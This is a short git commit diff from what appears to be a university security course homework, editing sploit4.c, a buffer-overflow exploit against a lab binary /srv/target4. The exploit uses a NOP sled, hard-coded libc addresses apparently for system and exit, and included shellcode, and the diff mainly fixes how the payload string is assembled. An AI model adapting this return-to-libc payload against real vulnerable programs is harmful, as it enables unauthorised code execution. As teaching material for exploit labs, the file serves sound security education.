bcbedc06d505e24e6e26eaf28719cb1d9dcac8d2
justinhalford <justinhalford@gmail.com>
2024-05-10 20:50:25 -0400

    may 7

--- cs5435-hw4/sploits/sploit4.c
+++ cs5435-hw4/sploits/sploit4.c
@@ -4,7 +4,9 @@
 #include <string.h>
 #include <unistd.h>
 #include "shellcode.h"
+
 const char* TARGET = "/srv/target4";
+
 const char* SLED = "\x90\x90\x90\x90\x90\x90\x90\x90";
 const char* SYS = "\x60\x43\xe1\xf7";
 const char* EX = "\xc0\x6e\xe0\xf7";
@@ -14,10 +16,8 @@ int main(void)
 {
   char *args[3];
   char *env[1];
-
-  
-  args[0] = TARGET;
-  args[1] = SLED + SYS + EX + SH;
+  args[0] = (char*)TARGET;
+  args[1] = (char*)(SLED SYS EX SH);
   args[2] = NULL;
 
   env[0] = NULL;
